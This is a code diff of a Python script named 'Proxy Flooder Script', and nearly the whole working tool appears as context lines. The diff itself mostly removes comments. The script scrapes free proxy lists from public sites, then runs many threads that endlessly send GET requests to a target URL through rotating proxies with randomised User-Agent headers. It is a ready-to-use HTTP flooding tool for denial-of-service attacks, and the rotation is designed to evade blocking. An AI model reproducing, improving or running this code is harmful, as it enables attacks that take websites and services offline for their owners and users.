@@ -5,13 +5,12 @@ import threading
 import argparse
 import random
 
-# ANSI escape codes for colors
 class Colors:
-    SUCCESS = '\033[92m'  # Green
-    FAILURE = '\033[91m'  # Red
-    INFO = '\033[93m'     # Yellow
-    BANNER = '\033[94m'   # Blue
-    RESET = '\033[0m'     # Reset to default
+    SUCCESS = '\033[92m'
+    FAILURE = '\033[91m'
+    INFO = '\033[93m'
+    BANNER = '\033[94m'
+    RESET = '\033[0m'
 
 banner = f"""
 {Colors.BANNER}
@@ -24,7 +23,6 @@ banner = f"""
 
 print(banner)
 
-# Configuration using argparse
 parser = argparse.ArgumentParser(description='Proxy Flooder Script')
 parser.add_argument('--url', required=True, help='Target URL to flood. Example: http://example.com')
 parser.add_argument('--threads', type=int, default=20, help='Number of threads to use (default: 20). Example: 10')
@@ -37,22 +35,20 @@ num_threads = args.threads
 request_timeout = args.timeout
 proxy_file = args.proxy_file
 
-# Updated list of proxy sources (free proxy providers)
 proxy_sources = [
-    'https://www.sslproxies.org/',   # SSL Proxies
-    'https://free-proxy-list.net/',  # Free Proxy List
-    'https://www.us-proxy.org/',     # US Proxies
-    'https://www.socks-proxy.net/',  # Socks Proxies
-    'https://www.proxyscrape.com/free-proxy-list',  # ProxyScrape
-    'https://spys.one/en/free-proxy-list/',          # Spys.one
-    'https://hidemy.name/en/proxy-list/',            # HideMy.name
-    'https://www.proxy-list.download/',              # ProxyList+
-    'https://www.proxy-list.download/',              # Proxy-List.download
-    'https://www.socks-proxy.net/',                  # Socks-Proxy.net
-    'https://www.proxynova.com/proxy-server-list/',  # ProxyNova
-    'https://www.freeproxylists.net/',                # FreeProxyList
-    'https://www.globalproxy.io/free-proxy-list/',    # GlobalProxy
-    'https://www.proxies.io/proxies/',                # Proxies.io
+    'https://www.sslproxies.org/',
+    'https://free-proxy-list.net/',
+    'https://www.us-proxy.org/',
+    'https://www.socks-proxy.net/',
+    'https://www.proxyscrape.com/free-proxy-list',
+    'https://spys.one/en/free-proxy-list/',
+    'https://hidemy.name/en/proxy-list/',
+    'https://www.proxy-list.download/',
+    'https://www.socks-proxy.net/',
+    'https://www.proxynova.com/proxy-server-list/',
+    'https://www.freeproxylists.net/',
+    'https://www.globalproxy.io/free-proxy-list/',
+    'https://www.proxies.io/proxies/',
 ]
 
 user_agents = [
@@ -62,14 +58,13 @@ user_agents = [
 ]
 
 def scrape_proxies():
-    proxies = set()  # Use a set to avoid duplicate proxies
+    proxies = set()
     for source_url in proxy_sources:
         try:
             print(f"{Colors.INFO}Scraping proxies from {source_url}...{Colors.RESET}")
             response = requests.get(source_url)
             soup = BeautifulSoup(response.text, 'html.parser')
-            # Scrape proxies from the proxy table
-            for row in soup.find_all('tr')[1:]:  # Skip the header row
+            for row in soup.find_all('tr')[1:]:
                 columns = row.find_all('td')
                 if len(columns) >= 2:
                     ip = columns[0].text.strip()
@@ -92,20 +87,17 @@ def load_custom_proxies(file_path):
 
 def proxy_request(proxy):
     headers = {
-        'User-Agent': random.choice(user_agents)  # Randomize User-Agent headers
+        'User-Agent': random.choice(user_agents)
     }
     try:
-        # Sending request via the proxy with headers
         response = requests.get(target_url, proxies={'http': proxy, 'https': proxy}, headers=headers, timeout=request_timeout)
-        # Print the proxy address and status code of each request
         if response.status_code == 200:
             print(f"{Colors.SUCCESS}Request sent through proxy: {proxy}, Status Code: {response.status_code}{Colors.RESET}")
     except requests.RequestException:
-        # Optionally log failures to a file or handle as needed
-        pass  # Suppress error messages
+        pass
 
 def flood_proxies(proxies):
-    proxy_pool = cycle(proxies)  # Cycle through proxies endlessly
+    proxy_pool = cycle(proxies)
     while True:
         proxy = next(proxy_pool)
         proxy_request(proxy)
@@ -113,7 +105,6 @@ def flood_proxies(proxies):
 def main():
     print(f"{Colors.INFO}Target URL: {target_url}{Colors.RESET}")
     
-    # Load custom proxies from file if provided
     if proxy_file:
         proxies = load_custom_proxies(proxy_file)
     else:
@@ -126,18 +117,16 @@ def main():
     
     print(f"{Colors.INFO}Starting flood with {len(proxies)} proxies.{Colors.RESET}")
 
-    # Start threads
     threads = []
     for _ in range(num_threads):
         thread = threading.Thread(target=flood_proxies, args=(proxies,))
-        thread.daemon = True  # Set daemon so threads close when the main program exits
+        thread.daemon = True
         thread.start()
         threads.append(thread)
 
-    # Keep main thread alive
     try:
         while True:
-            pass  # Infinite loop to keep threads running
+            pass
     except KeyboardInterrupt:
         print(f"{Colors.INFO}\nStopping flood...{Colors.RESET}")
 
